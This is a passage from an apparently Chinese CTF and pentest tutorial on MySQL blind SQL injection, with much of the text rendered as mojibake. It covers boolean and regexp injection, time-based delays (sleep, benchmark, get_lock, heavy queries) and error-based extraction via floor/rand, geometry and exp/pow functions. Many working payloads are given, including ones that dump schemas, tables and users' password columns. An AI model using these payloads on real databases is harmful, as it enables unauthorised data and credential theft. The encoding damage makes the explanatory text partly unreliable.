ä½ç½®å¼€å§‹é•¿åº¦ä¸º len çš„å­—ç¬¦ä¸²</p></blockquote><pre class="language-none"><code class="language-none">SELECT INSERT("google.com", 1, 6, "runoob");  -- è¾“å‡ºï¼šrunoob.comSELECT INSERT("google.com", 1,2, "runoob");-- è¾“å‡ºï¼šrunoobogle.comå¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿç¬¬ä¸€æ­¥åˆ é™¤èµ·å§‹çš„å‰xä½ç¬¬äºŒæ­¥å¥—å¨ƒåˆ é™¤x+1ä½ä»¥åçš„æ‰€æœ‰æ ¹æ®è¿™ä¸¤æ­¥æˆ‘ä»¬å°±èƒ½å–å‡ºå­—ç¬¦ä¸²çš„ä»»æ„ä½ç½®çš„å­—ç¬¦ï¼Œä¹Ÿå°±ç›¸å½“äºå­—ç¬¦ä¸²çš„æˆªå–ä¾‹å­ï¼šç¬¬ä¸€æ­¥åˆ é™¤èµ·å§‹çš„å‰xä½SELECT INSERT("abcdef", 1,0, "");-- è¾“å‡ºï¼šabcdefSELECT INSERT("abcdef", 1,1, "");-- è¾“å‡ºï¼šbcdefç¬¬äºŒæ­¥å¥—å¨ƒåˆ é™¤x+1ä½ä»¥åçš„æ‰€æœ‰SELECT INSERT((INSERT("abcdef", 1,0, "")),2,9999,"");-- è¾“å‡ºï¼šaSELECT INSERT((INSERT("abcdef", 1,1, "")),2,9999,"");-- è¾“å‡ºï¼šbå¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªè¦æ”¹å˜ä¸­é—´çš„æ•°å­—ï¼Œå°±å¯ä»¥è¾“å‡ºä»»æ„ä½ç½®çš„å­—ç¬¦</code></pre><p><strong>æ³¨ï¼šTRIMå’ŒINSERTå‡½æ•°æ¯”è¾ƒç‰¹åˆ«ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸ä¼šè¢«è¿‡æ»¤äº†ï¼Œå¦‚æœå¸¸ç”¨çš„æˆªå–å‡½æ•°ä¸èƒ½ç”¨æ—¶ï¼Œå¯é€‰æ‹©è¿™ä¸¤ä¸ªå‡½æ•°</strong></p><p><strong>if/case</strong></p><p>ç”¨åœ¨selectæŸ¥è¯¢å½“ä¸­ï¼Œå½“åšä¸€ç§æ¡ä»¶æ¥è¿›è¡Œåˆ¤æ–­</p><p>åŸºæœ¬è¯­æ³•ï¼šif(æ¡ä»¶,ä¸ºçœŸç»“æœ,ä¸ºå‡ç»“æœ)</p><p><strong>caseåŸºæœ¬è¯­æ³•</strong></p><pre class="language-none"><code class="language-none">MySQL çš„ case when çš„è¯­æ³•æœ‰ä¸¤ç§ï¼šç®€å•å‡½æ•° CASE [col_name] WHEN [value1] THEN [result1]â€¦ELSE [default] ENDæœç´¢å‡½æ•° CASE WHEN [expr] THEN [result1]â€¦ELSE [default] ENDselect case 'a' when 'a' then 1 else 0 end;-- 1select case when 98&gt;12 then 1 else 0 end;</code></pre><p><strong>æ³¨ï¼šå¯ä»¥çœ‹å‡ºcaseçš„ç”¨æ³•ä¸ifç±»ä¼¼ï¼Œå½“ifè¢«è¿‡æ»¤æˆ–è€…</strong>**,**<strong>è¢«è¿‡æ»¤å¯ä»¥æ›¿æ¢ä¸ºcaseï¼Œå¹¶ä¸”åœ¨æ—¶é—´ç›²æ³¨ä¸­ï¼Œæ¡ä»¶è¯­å¥éå¸¸æœ‰ç”¨ï¼</strong></p><h4 id="regexp-rlike-æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥"><a href="#regexp-rlike-æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥" class="headerlink" title="regexp/rlike æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥"></a><strong>regexp/rlike æ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥</strong></h4><p>ç”¨æ³•ä»‹ç»ï¼šselect user() regexp â€˜^[a-z]â€™; Explainï¼šæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ï¼Œuser()ç»“æœä¸ºrootï¼Œregexp ä¸ºåŒ¹é…root çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ ç¬¬äºŒä½å¯ä»¥ç”¨select user() regexp â€˜^roâ€™æ¥è¿›è¡Œã€‚</p><p>ç»“æœè¿”å›0æˆ–è€…1.</p><p><strong>ç¤ºä¾‹ä»‹ç»ï¼š</strong></p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));select * from users where id=1 and 1=(user() regexp'^ri');</code></pre><p>é€šè¿‡if è¯­å¥çš„æ¡ä»¶åˆ¤æ–­ï¼Œè¿”å›ä¸€äº›æ¡ä»¶å¥ï¼Œæ¯”å¦‚if ç­‰æ„é€ ä¸€ä¸ªåˆ¤æ–­ã€‚æ ¹æ®è¿”å›ç»“æœæ˜¯å¦ç­‰äº0 æˆ–è€…1 è¿›è¡Œåˆ¤æ–­ã€‚</p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(select 1 from information_schema.tableswhere table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);</code></pre><p>è¿™é‡Œåˆ©ç”¨select æ„é€ äº†ä¸€ä¸ªåˆ¤æ–­è¯­å¥ã€‚æˆ‘ä»¬åªéœ€è¦æ›´æ¢regexp è¡¨è¾¾å¼å³å¯</p><p>â€˜^u[a-z]â€™ -&gt; â€˜^us[a-z]â€™ -&gt; â€˜^use[a-z]â€™ -&gt; â€˜^user[a-z]â€™ -&gt; FALSE</p><p>å¦‚ä½•çŸ¥é“åŒ¹é…ç»“æŸäº†ï¼Ÿè¿™é‡Œå¤§éƒ¨åˆ†æ ¹æ®ä¸€èˆ¬çš„å‘½åæ–¹å¼ï¼ˆç»éªŒï¼‰å°±å¯ä»¥åˆ¤æ–­ã€‚ä½†æ˜¯å¦‚ä½•ä½ åœ¨æ— æ³•åˆ¤æ–­çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨table_name regexp â€˜^username$â€™æ¥è¿›è¡Œåˆ¤æ–­ã€‚^æ˜¯ä»å¼€å¤´è¿›è¡ŒåŒ¹é…ï¼Œ$æ˜¯ä»ç»“å°¾å¼€å§‹åˆ¤æ–­ã€‚æ›´å¤šçš„è¯­æ³•å¯ä»¥å‚è€ƒmysql ä½¿ç”¨æ‰‹å†Œè¿›è¡Œäº†è§£ã€‚</p><p>ä½†æ˜¯è¿™ç§åšæ³•æ˜¯é”™è¯¯çš„ï¼Œlimit ä½œç”¨åœ¨å‰é¢çš„select è¯­å¥ä¸­ï¼Œè€Œä¸æ˜¯regexpã€‚é‚£æˆ‘ä»¬è¯¥å¦‚ä½•é€‰æ‹©ã€‚å…¶å®åœ¨regexp ä¸­æˆ‘ä»¬æ˜¯å–åŒ¹é…table_name ä¸­çš„å†…å®¹ï¼Œåªè¦table_name ä¸­æœ‰çš„å†…å®¹ï¼Œæˆ‘ä»¬ç”¨regexp éƒ½èƒ½å¤ŸåŒ¹é…åˆ°ã€‚å› æ­¤ä¸Šè¿°è¯­å¥ä¸ä»…ä»…å¯ä»¥é€‰æ‹©userï¼Œè¿˜å¯ä»¥åŒ¹é…å…¶ä»–é¡¹ã€‚</p><p><strong>æ³¨ï¼š</strong><code>regexpæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œéœ€è¦å¤§å°å†™æ•æ„Ÿéœ€è¦åŠ ä¸Šbinaryå…³é”®å­—</code></p><pre class="language-none"><code class="language-none">select binary database() regexp "^CTF";</code></pre><h4 id="like-åŒ¹é…æ³¨å…¥"><a href="#like-åŒ¹é…æ³¨å…¥" class="headerlink" title="like åŒ¹é…æ³¨å…¥"></a><strong>like åŒ¹é…æ³¨å…¥</strong></h4><p>å’Œä¸Šè¿°çš„æ­£åˆ™ç±»ä¼¼ï¼Œmysql åœ¨åŒ¹é…çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨like è¿›è¡ŒåŒ¹é…Sã€‚</p><p>è¿™é‡Œå¯ä»¥ç”¨äºè¿‡æ»¤<code>=</code>ä½¿ç”¨</p><p>ç”¨æ³•ï¼šselect user() like â€˜ro%â€™</p><h3 id="åŸºäºæ—¶é—´çš„SQL-ç›²æ³¨å»¶æ—¶æ³¨å…¥"><a href="#åŸºäºæ—¶é—´çš„SQL-ç›²æ³¨å»¶æ—¶æ³¨å…¥" class="headerlink" title="åŸºäºæ—¶é—´çš„SQL ç›²æ³¨å»¶æ—¶æ³¨å…¥"></a>åŸºäºæ—¶é—´çš„SQL ç›²æ³¨å»¶æ—¶æ³¨å…¥</h3><pre class="language-none"><code class="language-none">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23--if åˆ¤æ–­è¯­å¥ï¼Œæ¡ä»¶ä¸ºå‡ï¼Œæ‰§è¡Œsleep</code></pre><p>Psï¼šé‡åˆ°ä»¥ä¸‹è¿™ç§åˆ©ç”¨sleep()å»¶æ—¶æ³¨å…¥è¯­å¥</p><pre class="language-none"><code class="language-none">select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));</code></pre><p>è¯¥è¯­å¥æ„æ€æ˜¯åœ¨0-9 ä¹‹é—´æ‰¾ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½ã€‚ä½†æ˜¯åœ¨æˆ‘ä»¬å®é™…æ¸—é€è¿‡ç¨‹ä¸­ï¼Œè¿™ç§ç”¨æ³•æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºæ—¶é—´ä¼šæœ‰ç½‘é€Ÿç­‰å…¶ä»–å› ç´ çš„å½±å“ï¼Œæ‰€ä»¥ä¼šå½±å“ç»“æœçš„åˆ¤æ–­ã€‚</p><p><strong>benchmark</strong></p><p>MySQLæœ‰ä¸€ä¸ªå†…ç½®çš„BENCHMARK()å‡½æ•°ï¼Œå¯ä»¥æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ã€‚å‚æ•°å¯ä»¥æ˜¯éœ€è¦æ‰§è¡Œçš„æ¬¡æ•°å’Œè¡¨è¾¾å¼ã€‚è¡¨è¾¾å¼å¯ä»¥æ˜¯ä»»ä½•çš„æ ‡é‡è¡¨è¾¾å¼ï¼Œæ¯”å¦‚è¿”å›å€¼æ˜¯æ ‡é‡çš„å­æŸ¥è¯¢æˆ–è€…å‡½æ•°ã€‚è¯¥å‡½æ•°å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ€§èƒ½ï¼Œæ¯”å¦‚é€šè¿‡æµ‹è¯•å¯ä»¥å‘ç°ï¼ŒMD5()å‡½æ•°æ¯”SHAI()å‡½æ•°è¦å¿«</p><pre class="language-none"><code class="language-none">select benchmark(1000000,sha1(sha1(sha1(sha1("1")))));</code></pre><pre class="language-none"><code class="language-none">UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(â€˜MSGâ€™,â€™by 5 secondsâ€™)),null) FROM (select database() as current) as tb1;</code></pre><p><strong>ç¬›å¡å„¿ç§¯</strong></p><p>è¿™ç§æ–¹æ³•åˆå«åšheavy queryï¼Œå¯ä»¥é€šè¿‡é€‰å®šä¸€ä¸ªå¤§è¡¨æ¥åšç¬›å¡å„¿ç§¯ï¼Œä½†è¿™ç§æ–¹å¼æ‰§è¡Œæ—¶é—´ä¼šå‡ ä½•å€æ•°çš„æå‡ï¼Œåœ¨ç«™æ¯”è¾ƒå¤§çš„æƒ…å†µä¸‹ä¼šé€ æˆå‡ ä½•å€æ•°çš„æ•ˆæœï¼Œå®é™…åˆ©ç”¨èµ·æ¥éå¸¸ä¸å¥½ç”¨ã€‚</p><p>1.<code>count()</code>å‡½æ•°æ˜¯ç”¨æ¥ç»Ÿè®¡è¡¨ä¸­è®°å½•çš„ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›åŒ¹é…æ¡ä»¶çš„è¡Œæ•°ã€‚ 2.<code>count()</code>è¯­æ³•ï¼š ï¼ˆ1ï¼‰<code>count(*)</code>â€”åŒ…æ‹¬æ‰€æœ‰åˆ—ï¼Œè¿”å›è¡¨ä¸­çš„è®°å½•æ•°ï¼Œç›¸å½“äºç»Ÿè®¡è¡¨çš„è¡Œæ•°ï¼Œåœ¨ç»Ÿè®¡ç»“æœçš„æ—¶å€™ï¼Œä¸ä¼šå¿½ç•¥åˆ—å€¼ä¸ºNULLçš„è®°å½•ã€‚ ï¼ˆ2ï¼‰<code>count(1)</code>â€”å¿½ç•¥æ‰€æœ‰åˆ—ï¼Œ1è¡¨ç¤ºä¸€ä¸ªå›ºå®šå€¼ï¼Œä¹Ÿå¯ä»¥ç”¨<code>count(2)</code>ã€<code>count(3)</code>ä»£æ›¿ï¼Œåœ¨ç»Ÿè®¡ç»“æœçš„æ—¶å€™ï¼Œä¸ä¼šå¿½ç•¥åˆ—å€¼ä¸º<code>NULL</code>çš„è®°å½•ã€‚ ï¼ˆ3ï¼‰<code>count(åˆ—å)</code>â€”åªåŒ…æ‹¬åˆ—åæŒ‡å®šåˆ—ï¼Œè¿”å›æŒ‡å®šåˆ—çš„è®°å½•æ•°ï¼Œåœ¨ç»Ÿè®¡ç»“æœçš„æ—¶å€™ï¼Œä¼šå¿½ç•¥åˆ—å€¼ä¸ºNULLçš„è®°å½•ï¼ˆä¸åŒ…æ‹¬ç©ºå­—ç¬¦ä¸²å’Œ0ï¼‰ï¼Œå³åˆ—å€¼ä¸ºNULLçš„è®°å½•ä¸ç»Ÿè®¡åœ¨å†…ã€‚ ï¼ˆ4ï¼‰<code>count(distinct åˆ—å)</code>â€”åªåŒ…æ‹¬åˆ—åæŒ‡å®šåˆ—ï¼Œè¿”å›æŒ‡å®šåˆ—çš„ä¸åŒå€¼çš„è®°å½•æ•°ï¼Œåœ¨ç»Ÿè®¡ç»“æœçš„æ—¶å€™ï¼Œåœ¨ç»Ÿè®¡ç»“æœçš„æ—¶å€™ï¼Œä¼šå¿½ç•¥åˆ—å€¼ä¸ºNULLçš„è®°å½•ï¼ˆä¸åŒ…æ‹¬ç©ºå­—ç¬¦ä¸²å’Œ0ï¼‰ï¼Œå³åˆ—å€¼ä¸ºNULLçš„è®°å½•ä¸ç»Ÿè®¡åœ¨å†…ã€‚ 3.<code>count(*)&amp;count(1)&amp;count(åˆ—å)</code>æ‰§è¡Œæ•ˆç‡æ¯”è¾ƒï¼š ï¼ˆ1ï¼‰å¦‚æœåˆ—ä¸ºä¸»é”®ï¼Œ<code>count(åˆ—å)</code>æ•ˆç‡ä¼˜äº<code>count(1)</code> ï¼ˆ2ï¼‰å¦‚æœåˆ—ä¸ä¸ºä¸»é”®ï¼Œ<code>count(1)</code>æ•ˆç‡ä¼˜äº<code>count(åˆ—å)</code> ï¼ˆ3ï¼‰å¦‚æœè¡¨ä¸­å­˜åœ¨ä¸»é”®ï¼Œ<code>count(ä¸»é”®åˆ—å)</code>æ•ˆç‡æœ€ä¼˜ ï¼ˆ4ï¼‰å¦‚æœè¡¨ä¸­åªæœ‰ä¸€åˆ—ï¼Œåˆ™<code>count(*)</code>æ•ˆç‡æœ€ä¼˜ ï¼ˆ5ï¼‰å¦‚æœè¡¨æœ‰å¤šåˆ—ï¼Œä¸”ä¸å­˜åœ¨ä¸»é”®ï¼Œåˆ™<code>count(1)</code>æ•ˆç‡ä¼˜äº<code>count(*)</code></p><pre class="language-none"><code class="language-none">select count(*) from information_schema.columns A;1 row in set (1.47 sec)</code></pre><p><strong>get_lock</strong></p><pre class="language-none"><code class="language-none">SELECT GET_LOCK(key, timeout) FROM DUAL;SELECT RELEASE_LOCK(key) FROM DUAL;</code></pre><p>å…¶ä¸­GET_LOCK()å’ŒRELEASE_LOCK()åˆ†åˆ«æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æœ‰å‚æ•°å’Œè¿”å›å€¼ï¼Œè¿™é‡Œçš„DUALæ˜¯ä¼ªè¡¨ï¼Œåœ¨Oracleä¸­å¾ˆå¸¸è§ï¼Œå°±æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„è¡¨ï¼Œç”¨æ¥ä¸´æ—¶è®°å½•å€¼çš„ã€‚</p><ul><li>GET_LOCKæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯keyï¼Œå°±æ˜¯æ ¹æ®è¿™ä¸ªå‚æ•°è¿›è¡ŒåŠ é”çš„ï¼Œå¦ä¸€ä¸ªæ˜¯ç­‰å¾…æ—¶é—´(s)ï¼Œå³è·å–é”å¤±è´¥åç­‰å¾…å¤šä¹…å›æ»šäº‹åŠ¡ã€‚</li><li>è¿™é‡Œå‡è®¾è¿æ¥Aå…ˆGET_LOCK(â€œlock_testâ€, 10)ï¼Œå› ä¸ºlock_testè¿™ä¸ªå­—æ®µåœ¨ä¹‹å‰æ²¡æœ‰åŠ é”æ‰€ä»¥ä¸éœ€è¦ç­‰å¾…ï¼Œç›´æ¥è¿”å›1ï¼ŒåŠ é”æˆåŠŸã€‚ ç„¶åè¿æ¥Bå†GET_LOCK(â€œlock_testâ€, 10)ï¼Œç­‰å¾…10sï¼Œè‹¥è¿™æœŸé—´æ²¡æœ‰é‡Šæ”¾è¿™ä¸ªå­—æ®µçš„é”ï¼Œåˆ™10sè¿‡åè¿”å›0ï¼Œè¿æ¥BåŠ é”å¤±è´¥ã€‚ è¿™é‡Œçš„é—®é¢˜å°±æ˜¯è¿™ä¸ªåŠ é”æ–¹å¼å¾ˆå±é™©ï¼Œä¸€æ—¦åŠ é”ä¹‹åå¿˜è®°é‡Šæ”¾ï¼Œå°±ä¼šä¸€ç›´é”ä½è¿™ä¸ªå­—æ®µï¼Œé™¤éè¿æ¥æ–­å¼€ã€‚å°¤å…¶æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œåƒä¸‡ä¸è¦ç†è§£æˆè¶…æ—¶æ—¶é—´ï¼Œå¹¶ä¸æ˜¯è®¾ç½®ä¸€ä¸ªå­—æ®µçš„é”ï¼Œç„¶åè¶…è¿‡è¿™ä¸ªæ—¶é—´å°±è‡ªåŠ¨é‡Šæ”¾äº†ï¼Œè¿™ä¸ªæ˜¯ç­‰å¾…æ—¶é—´ï¼Œå³ç¬¬äºŒæ¬¡å¯¹åŒä¸€ä¸ªå­—æ®µåŠ é”ï¼Œç­‰å¾…å¤šä¹…ç„¶åè¿”å›ã€‚</li><li>è¿™ä¸ªRELEASE_LOCKå°±æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œè®°å¾—åŠ é”ä¹‹åé‡Šæ”¾å°±å¯ä»¥äº†ï¼ŒæˆåŠŸé‡Šæ”¾å›è¿”å›1ã€‚</li></ul><p>åœ¨ä¸€ä¸ªè¿æ¥sessionä¸­å¯ä»¥å…ˆé”å®šä¸€ä¸ªå˜é‡ï¼Œä¾‹å¦‚ï¼š<code>select get_lock('aaa',1);</code></p><p>ç„¶åå†é€šè¿‡å¦ä¸€ä¸ªè¿æ¥sessionï¼Œå†æ¬¡æ‰§è¡Œget_lockå‡½æ•°ï¼š<code>select get_lock('aaa',2);</code>ï¼Œæ­¤æ—¶å°†äº§ç”Ÿ2ç§’çš„å»¶æ—¶ã€‚</p><pre class="language-none"><code class="language-none">//ç¬¬ä¸€ä¸ªè¿æ¥mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 1 |+-------------------+1 row in set (0.00 sec)//æ‰“å¼€å¦ä¸€ä¸ªcmd  å†æ¬¡è¿æ¥mysqlï¼Œæ‰§è¡Œget_lockï¼Œå‘ç°å»¶æ—¶mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 0 |+-------------------+1 row in set (1.00 sec)</code></pre><p>åˆ©ç”¨åœºæ™¯æ˜¯æœ‰æ¡ä»¶é™åˆ¶çš„ï¼šéœ€è¦æä¾›é•¿è¿æ¥ã€‚åœ¨<code>Apache+PHP</code>æ­å»ºçš„ç¯å¢ƒä¸­éœ€è¦ä½¿ç”¨<code>mysql_pconnect(æ‰“å¼€ä¸€ä¸ªåˆ° MySQL æœåŠ¡å™¨çš„æŒä¹…è¿æ¥)</code>å‡½æ•°æ¥è¿æ¥æ•°æ®åº“ã€‚åœ¨CTFä¸­ï¼Œåªæœ‰å‡ºé¢˜äººå¾ˆåˆ»æ„çš„ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰æš—ç¤ºä½¿ç”¨è¿™ä¸ª</p><p><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></p><p>æ­£åˆ™åŒ¹é…åœ¨åŒ¹é…è¾ƒé•¿å­—ç¬¦ä¸²å•è‡ªç”±åº¦æ¯”è¾ƒé«˜çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæœ‰å¤§é‡çš„å›æº¯ï¼Œé€ æˆè¾ƒå¤§çš„è®¡ç®—é‡</p><pre class="language-none"><code class="language-none">select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');mysql&gt; select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');+-------------------------------------------------------------+| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |+-------------------------------------------------------------+|                                                           0 |+-------------------------------------------------------------+1 row in set (2.94 sec)</code></pre><h3 id="åŸºäºæŠ¥é”™çš„SQL-ç›²æ³¨"><a href="#åŸºäºæŠ¥é”™çš„SQL-ç›²æ³¨" class="headerlink" title="åŸºäºæŠ¥é”™çš„SQL ç›²æ³¨"></a>åŸºäºæŠ¥é”™çš„SQL ç›²æ³¨</h3><p>æŠ¥é”™æ³¨å…¥åœ¨æ²¡æ³•ç”¨unionè”åˆæŸ¥è¯¢æ—¶ç”¨ï¼Œä½†å‰æè¿˜æ˜¯ä¸èƒ½è¿‡æ»¤ä¸€äº›å…³é”®çš„å‡½æ•°</p><p>æŠ¥é”™æ³¨å…¥å°±æ˜¯åˆ©ç”¨äº†æ•°æ®åº“çš„æŸäº›æœºåˆ¶ï¼Œè®¤ä¸ºçš„åˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å¤Ÿ å‡ºç°åœ¨é”™è¯¯ä¿¡æ¯ä¸­ã€‚</p><p>æ„é€ payload è®©ä¿¡æ¯é€šè¿‡é”™è¯¯æç¤ºå›æ˜¾å‡ºæ¥</p><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></pre><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p><p><strong>floor()</strong></p><blockquote><p>floor(x)</p><p>è¿”å›å°äºæˆ–ç­‰äº x çš„æœ€å¤§æ•´æ•°ã€€ã€€</p></blockquote><pre class="language-none"><code class="language-none">SELECT FLOOR(1.5) -- è¿”å›1</code></pre><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</code></pre><p>ä»¥ä¸Šè¯­å¥å¯ä»¥ç®€åŒ–æˆå¦‚ä¸‹çš„å½¢å¼ã€‚</p><pre class="language-none"><code class="language-none">select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))</code></pre><p>å¦‚æœå…³é”®çš„è¡¨è¢«ç¦ç”¨äº†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§å½¢å¼</p><pre class="language-none"><code class="language-none">select count(*) from (select 1 union select null unionselect !1) group by concat(version(),floor(rand(0)*2))</code></pre><p>å¦‚æœrand è¢«ç¦ç”¨äº†å¯ä»¥ä½¿ç”¨ç”¨æˆ·å˜é‡æ¥æŠ¥é”™</p><pre class="language-none"><code class="language-none">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></pre><pre class="language-none"><code class="language-none">çˆ†åº“select 1 from ( select count(*),(concat((select schema_name from information_schema.schemata limit0,1),â€™|â€™,floor(rand(0)*2)))x from information_schema.tables group by x )a;http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinctconcat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)çˆ†è¡¨select 1 from (select count(*),(concat((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),â€™|â€™,floor(rand(0)*2)))x from information_schema.tables group by x)a;çˆ†å­—æ®µselect 1 from (select count(*),(concat((select column_name from information_schema.columns wheretable_schema=database() and table_name=â€˜usersâ€™ limit 0,1),â€™|â€™,floor(rand(0)*2)))x from information_schema.tablesgroup by x)a;çˆ†æ•°æ®select 1 from (select count(*),(concat((select concat(name,â€™|â€™,passwd,â€™|â€™,birth) from users limit0,1),â€™|â€™,floor(rand(0)*2)))x from information_schema.tables group by x)a;select 1 from(select count(*),concat((select (select (SELECT concat(0x23,name,0x3a,passwd,0x23) FROM users limit0,1)) from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a</code></pre><p><strong>å‡ ä½•å‡½æ•°</strong></p><pre class="language-none"><code class="language-none">GeometryCollectionï¼šid=1 AND GeometryCollection((select * from (select* from(select user())a)b))polygon()ï¼šid=1 AND polygon((select * from(select * from(select user())a)b))multipoint()ï¼šid=1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()ï¼šid=1 AND multilinestring((select * from(select * from(select user())a)b))linestring()ï¼šid=1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon() ï¼šid=1 AND multipolygon((select * from(select * from(select user())a)b))</code></pre><p><strong>ä¸å­˜åœ¨å‡½æ•°</strong></p><pre class="language-none"><code class="language-none">å¯ä»¥ç”¨æ¥çˆ†æ•°æ®åº“select a();ERROR 1305 (42000): FUNCTION mysql.a does not exist</code></pre><p><strong>name_const()</strong></p><pre class="language-none"><code class="language-none">ä»…å¯å–æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯select * from(select name_const(version(),0x1),name_const(version(),0x1))a;ERROR 1060 (42S21): Duplicate column name '5.5.29'</code></pre><p><strong>uuidç›¸å…³å‡½æ•°</strong></p><pre class="language-none"><code class="language-none">é€‚ç”¨ç‰ˆæœ¬ï¼š8.0.xmysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</code></pre><p><strong>exp()</strong></p><blockquote><p>exp(int)</p><p>è¿”å›eçš„xæ¬¡æ–¹</p><p>é€‚ç”¨ç‰ˆæœ¬ï¼šç‰ˆæœ¬åœ¨5.5.5~5.5.49</p></blockquote><pre class="language-none"><code class="language-none">select exp(~(select * FROM(SELECT USER())a));--å…¶ä¸­ï¼Œ~ç¬¦å·ä¸ºè¿ç®—ç¬¦ï¼Œæ„æ€ä¸ºä¸€å…ƒå­—ç¬¦åè½¬ï¼Œé€šå¸¸å°†å­—ç¬¦ä¸²ç»è¿‡å¤„ç†åå˜æˆå¤§æ•´æ•°ï¼Œå†æ”¾åˆ°expå‡½ æ•°å†…ï¼Œå¾—åˆ°çš„ç»“æœå°†è¶…è¿‡mysqlçš„doubleæ•°ç»„èŒƒå›´ï¼Œä»è€ŒæŠ¥é”™è¾“å‡ºã€‚é™¤äº†exp()ä¹‹å¤–ï¼Œè¿˜æœ‰ç±»ä¼¼pow()ä¹‹ç±»çš„ç›¸ä¼¼å‡½æ•°åŒæ ·æ˜¯å¯åˆ©ç”¨çš„ï¼Œä»–ä»¬çš„åŸç†ç›¸åŒã€‚--double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´--Exp()ä¸ºä»¥e ä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼›--ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'å¦‚æœæ˜¯åœ¨é€‚ç”¨ç‰ˆæœ¬ä¹‹å¤–ï¼šè™½ç„¶ä¹Ÿä¼šæŠ¥é”™ï¼Œä½†æ˜¯è¡¨åä¸ä¼šå‡ºæ¥select !(select * from(select user())a)-~0;</code></pre><p><strong>expã€cotã€powã€absç­‰å¯ä»¥æŠ¥é”™</strong></p><pre class="language-none"><code class="language-none">select abs(99999e9999999); #å¯ä½¿ç”¨åœ¨æŠ¥é”™çš„å¸ƒå°”ç›²æ³¨ä¸­ERROR 1367 (22007): Illegal double '99999e9999999' value found during parsingselect pow(1+(1=1),999999999999);mysql&gt; select pow(1+(1=1),999999999999);ERROR 1690 (22003): DOUBLE value is out of range in 'pow((1 + (1 = 1)),999999999999)'mysql&gt; select pow(1+(1=0),999999999999);+---------------------------+| pow(1+(1=0),999999999999) |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)é€šè¿‡è¿™ç§å†™æ³•ï¼Œå¯ä»¥å®ç°æŠ¥é”™æ³¨å…¥select pow(1+(è¡¨è¾¾å¼),999999999999)è¡¨è¾¾å¼å¯ä»¥æ˜¯ç›²æ³¨çš„å½¢å¼ï¼Œè¿”å›1æˆ–è€…0ï¼Œé€šè¿‡æŠ¥é”™å°†å­—ç¬¦æ‰å‡ºæ¥å…¶ä»–å‡½æ•°ç”¨æ³•ç±»ä¼¼expä¸´ç•Œå€¼709exp(709+(1=0))</code></pre><p>å¯ä»¥å‚è€ƒexp æŠ¥é”™æ–‡ç« ï¼š<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><pre class="language-none"><code class="language-none">select !(select * from (select user())x) -ï¼ˆps:è¿™æ˜¯å‡å·ï¼‰ ~0--bigint è¶…å‡ºèŒƒå›´ï¼›~0 